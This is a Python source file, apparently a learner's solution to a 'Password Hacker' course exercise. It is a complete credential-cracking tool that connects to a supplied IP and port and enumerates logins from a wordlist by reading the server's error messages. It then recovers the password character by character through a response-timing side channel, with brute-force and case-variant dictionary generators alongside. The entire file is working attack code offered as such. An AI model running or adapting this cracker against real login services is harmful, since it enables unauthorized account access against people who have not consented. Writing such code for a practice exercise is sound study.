import argparse
import socket
import itertools
import string
import json
import time


class PasswordCracker:
    simbols_list = string.digits + string.ascii_letters + string.punctuation

    def __init__(self,  host_address):
        self.address = host_address
        self.correct_login = None
        self.correct_password = None

    @staticmethod
    def generate_password() -> tuple:
        """Generate password by symbols"""
        index = 1
        simbols_list = string.digits + string.ascii_letters + string.punctuation
        while True:
            yield from itertools.product(simbols_list, repeat=index)
            index += 1

    @staticmethod
    def generate_password_from_file() -> str:
        """Generate password from file with given passwords data"""
        path = "C:\\Users\\Ruslan Mustakaev\\PycharmProjects\\" \
               "Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt"
        with open(path, "r") as file:
            passwords = (line for line in file.read().splitlines())
            for password in passwords:
                if password.isdigit():
                    yield password
                else:
                    for var in itertools.product(*([letter.lower(), letter.upper()] for letter in password)):
                        yield "".join(var)

    @staticmethod
    def generate_login_from_file():
        """Generate login from file with given logins data"""
        with open('D:\\Задачки\\Stepik\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt', 'r') as logins:
            while True:
                yield from logins.read().splitlines()

    @staticmethod
    def request_to_server(login, password=" ") -> json:
        """Convert the given login and password to json string request"""
        return json.dumps({"login": login, "password": password})

    def find_login(self, client_socket) -> None:
        """Finds correct login by iteration of logins from data file"""
        for generated_login in self.generate_login_from_file():
            client_socket.send(self.request_to_server(generated_login).encode(encoding='utf-8'))
            json_server_response = client_socket.recv(1024).decode(encoding='utf-8')
            if json.loads(json_server_response)["result"] == "Wrong password!":
                self.correct_login = generated_login
                return None

    def find_password(self, client_socket):
        """Finds the correct password by iterating over characters and measuring server response time"""
        password_list = []
        while True:
            for symbol in self.simbols_list:
                check_password = "".join(password_list) + symbol
                start_time = time.time()
                request_to_server = self.request_to_server(self.correct_login, check_password).encode(encoding='utf-8')
                client_socket.send(request_to_server)
                server_response = client_socket.recv(1024).decode(encoding='utf-8')
                end_time = time.time()
                if (end_time - start_time) >= 0.1 and json.loads(server_response)["result"] == "Wrong password!":
                    password_list.append(symbol)
                elif json.loads(server_response)["result"] == "Connection success!":
                    self.correct_password = check_password
                    return None
                else:
                    continue
            else:
                continue

    def correct_login_and_password(self):
        with socket.socket() as client_socket:
            client_socket.connect(self.address)
            self.find_login(client_socket)
            self.find_password(client_socket)
            return self.request_to_server(self.correct_login, self.correct_password)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This program is hack admin login and password")
    parser.add_argument("IP_address", type=str)
    parser.add_argument("port", type=int)

    args = parser.parse_args()

    address = (args.IP_address, args.port)

    request = PasswordCracker(address)
    print(request.correct_login_and_password())
